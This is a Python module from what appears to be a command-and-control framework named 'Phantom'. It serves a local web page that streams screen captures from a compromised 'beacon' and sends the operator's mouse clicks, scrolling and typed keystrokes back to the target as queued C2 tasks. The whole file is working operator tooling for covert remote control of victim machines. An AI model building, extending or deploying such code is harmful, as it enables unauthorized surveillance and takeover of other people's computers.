"""
remote_viewer.py — tiny browser viewer for the Remote Session module.

The CLI's `remote-view` ASCII stream is a monitoring aid, not a control
surface. This module serves a small, dependency-free HTML page on the
operator's loopback interface that renders the remote module's frame
stream like a video feed and forwards mouse/keyboard directly — the
same experience as the Electron Remote tab, but from the CLI.

Design constraints:
* loopback ONLY (binds 127.0.0.1, random free port) — the control
  channel for a live session must never be exposed on the network;
* auto-opening the operator's default browser via `webbrowser`;
* frames come from the artifacts API (data/remote/); input goes back
  as in-band beacon tasks (`remote input ...`) through the C2 state;
* aiohttp is already a Phantom dependency (the API server uses it).
"""

from __future__ import annotations

import base64
import json
import threading
import webbrowser
from typing import Optional, Tuple

from aiohttp import web

from phantom.core.c2_server import c2_state

_HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Phantom Remote Session</title>
<style>
  :root { color-scheme: dark; }
  body { margin:0; background:#0b0b10; color:#c9c9d4;
         font:13px/1.4 ui-monospace,Consolas,monospace; }
  header { display:flex; align-items:center; gap:12px; padding:8px 14px;
           background:#14141c; border-bottom:1px solid #26262f; }
  header b { color:#e05555; letter-spacing:1px; }
  .pill { padding:2px 8px; border-radius:4px; font-size:11px;
          background:#1d1d27; border:1px solid #2c2c38; }
  .live { color:#7ee787; }
  button { background:#1d1d27; color:#c9c9d4; border:1px solid #2c2c38;
           border-radius:5px; padding:4px 10px; cursor:pointer; font:inherit; }
  button:hover { border-color:#e05555; }
  .stage { position:relative; height:calc(100vh - 110px);
           display:flex; align-items:center; justify-content:center;
           background:#000; }
  img#frame { max-width:100%; max-height:100%; object-fit:contain;
              cursor:crosshair; user-select:none; }
  .bar { display:flex; gap:8px; padding:8px 14px; background:#14141c;
         border-top:1px solid #26262f; }
  input[type=text] { flex:1; background:#101018; color:#e6e6ee;
                     border:1px solid #2c2c38; border-radius:5px;
                     padding:6px 10px; font:inherit; }
  .hint { color:#666; font-size:11px; }
  .badge { position:absolute; top:10px; right:12px; font-size:11px;
           color:#ff6b6b; background:#000a; padding:2px 8px;
           border-radius:4px; display:none; }
  .badge b { animation:bl 1s infinite; }
  @keyframes bl { 50% { opacity:.2 } }
</style>
</head>
<body>
<header>
  <b>PHANTOM</b><span class="pill">remote session</span>
  <span class="pill" id="beacon">—</span>
  <span style="flex:1"></span>
  <button id="btn-start">&#9654; start</button>
  <button id="btn-live">&#9889; live</button>
  <button id="btn-stop">&#9632; stop</button>
  <button id="btn-frame">&#128247; frame</button>
</header>
<div class="stage">
  <img id="frame" alt="">
  <span class="badge" id="badge"><b>&#9679;</b> STREAMING</span>
  <p id="empty" class="hint">No frames yet — press <b>start</b>, or deploy the
  module with the beacon's <b>remote</b> command / remote-deploy.</p>
</div>
<div class="bar">
  <input type="text" id="typeline" placeholder='type + Enter = type on target ·
    mouse on image = move/click · wheel = scroll · PgUp/PgDn keys' autocomplete="off">
  <span class="hint" id="fps"></span>
</div>
<script>
const BID = %BEACON_ID%;
const $ = (id) => document.getElementById(id);
let lastSeq = "", streaming = false, live = false, typing = "";

async function api(method, endpoint, body) {
  const r = await fetch(endpoint, {
    method, headers: {"Content-Type": "application/json"},
    body: body ? JSON.stringify(body) : undefined });
  return r.json();
}

function input(cmd) { api("POST", "/send", { cmd: "remote input " + cmd }); }

$("beacon").textContent = BID;

$("btn-start").onclick = () => { streaming = true; live = false;
  badge(); api("POST", "/send", { cmd: "remote start" }); };
$("btn-live").onclick  = () => { streaming = true; live = true;
  badge(); api("POST", "/send", { cmd: "remote live" }); };
$("btn-stop").onclick  = () => { streaming = false; live = false;
  badge(); api("POST", "/send", { cmd: "remote stop" }); };
$("btn-frame").onclick = () => api("POST", "/send", { cmd: "remote frame" });

function badge() {
  $("badge").style.display = streaming ? "block" : "none";
  $("badge").innerHTML = "<b>\\u25CF</b> " + (live ? "LIVE" : "STREAMING");
}

// ── frame polling (newest artifact) ─────────────────────────────────
let t0 = performance.now(), frames = 0;
setInterval(async () => {
  const arts = await api("GET", "/frames");
  const f = (arts.frames || [])[0];
  if (!f) return;
  if (f.name !== lastSeq) {
    lastSeq = f.name;
    $("frame").src = "/frame?name=" + encodeURIComponent(f.name) + "&t=" + Date.now();
    $("empty").style.display = "none";
    frames++;
    const dt = (performance.now() - t0) / 1000;
    if (dt > 2) { $("fps").textContent = (frames / dt).toFixed(1) + " fps"; }
  }
}, live ? 300 : 1200);

// keep poll interval in sync with live mode
setInterval(() => {}, 60000);

// ── input: the image IS the control surface ─────────────────────────
const img = $("frame");
let lastMove = 0;
function coords(e) {
  const r = img.getBoundingClientRect();
  if (!img.naturalWidth) return null;
  return { x: Math.round((e.clientX - r.left) / r.width  * img.naturalWidth),
           y: Math.round((e.clientY - r.top)  / r.height * img.naturalHeight) };
}
img.addEventListener("mousemove", (e) => {
  const now = Date.now();
  if (now - lastMove < 120) return;      // throttle
  lastMove = now;
  const c = coords(e); if (c) input("move " + c.x + " " + c.y);
});
img.addEventListener("mousedown", (e) => {
  const c = coords(e); if (c) input("click " + c.x + " " + c.y);
});
img.addEventListener("wheel", (e) => {
  e.preventDefault(); input("scroll " + (e.deltaY < 0 ? 1 : -1));
}, { passive: false });

// typing
const tl = $("typeline");
tl.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    if (tl.value) { input("type " + tl.value); tl.value = ""; }
    return;
  }
  if (e.key === "Escape") { input("key ESC"); return; }
  if (e.key === "Tab")    { input("key TAB"); return; }
  if (e.key === "PageUp") { input("key PRIOR"); return; }
  if (e.key === "PageDown") { input("key NEXT"); return; }
});
</script>
</body>
</html>"""


def _resolve_beacon(bid_prefix: str) -> Tuple[str, str]:
    """Resolve a (possibly short) beacon id prefix to a full R-/beacon id."""
    beacons = c2_state.get_beacons()
    if not beacons:
        raise web.HTTPNotFound(text=json.dumps({"error": "no beacons connected"}))
    if bid_prefix in beacons:
        return bid_prefix, str(beacons[bid_prefix].get("hostname", ""))
    matches = [b for b in beacons if b.startswith(bid_prefix)]
    if len(matches) == 1:
        return matches[0], str(beacons[matches[0]].get("hostname", ""))
    raise web.HTTPNotFound(text=json.dumps(
        {"error": f"ambiguous or unknown beacon '{bid_prefix}'"}))


def make_app(beacon_id: str) -> web.Application:
    bid, _host = _resolve_beacon(beacon_id)
    routes = web.RouteTableDef()

    @routes.get("/")
    async def index(_request: web.Request) -> web.Response:
        html = _HTML.replace("%BEACON_ID%", bid)
        return web.Response(text=html, content_type="text/html")

    @routes.get("/frames")
    async def frames(_request: web.Request) -> web.Response:
        # newest frame artifacts for this beacon (data/remote/)
        from phantom.utils.paths import data_dir
        import os
        d = os.path.join(data_dir(), "remote")
        out = []
        if os.path.isdir(d):
            for name in sorted(os.listdir(d), reverse=True)[:8]:
                p = os.path.join(d, name)
                if os.path.isfile(p):
                    out.append({"name": name, "size": os.path.getsize(p)})
        return web.json_response({"frames": out, "beacon": bid})

    @routes.get("/frame")
    async def frame(request: web.Request) -> web.Response:
        from phantom.utils.paths import data_dir
        import os
        name = os.path.basename(request.query.get("name", ""))
        p = os.path.join(data_dir(), "remote", name)
        if not name or not os.path.isfile(p):
            return web.Response(status=404, text="no such frame")
        with open(p, "rb") as fh:
            raw = fh.read()
        media = "image/png" if raw[:8] == b"\x89PNG\r\n\x1a\n" else "image/jpeg"
        return web.Response(body=raw, content_type=media)

    @routes.post("/send")
    async def send(request: web.Request) -> web.Response:
        body = await request.json() or {}
        cmd = str(body.get("cmd", "")).strip()
        if not cmd:
            return web.json_response({"error": "empty"}, status=400)
        c2_state.queue_task(bid, cmd)
        return web.json_response({"ok": True})

    app = web.Application()
    app.add_routes(routes)
    return app


def launch_viewer(beacon_id: str, open_browser: bool = True,
                  timeout: Optional[float] = None) -> Tuple[int, threading.Thread]:
    """Serve the viewer on 127.0.0.1:<random free port> and optionally open
    the browser. Returns (port, server_thread). The caller decides when to
    shut the thread down (daemon thread: dies with the process)."""
    app = make_app(beacon_id)
    runner = web.AppRunner(app)
    loop_holder = {}

    def _run() -> None:
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def _serve() -> int:
            await runner.setup()
            site = web.TCPSite(runner, "127.0.0.1", 0)  # random free port
            await site.start()
            return runner.addresses[0][1]

        loop_holder["port"] = loop.run_until_complete(_serve())
        loop_holder["runner"] = runner
        loop_holder["loop"] = loop
        loop.run_forever()

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    # wait for the port to be assigned
    import time
    for _ in range(50):
        if "port" in loop_holder:
            break
        time.sleep(0.1)
    port = loop_holder.get("port", 0)
    if open_browser and port:
        webbrowser.open(f"http://127.0.0.1:{port}/")
    return port, t
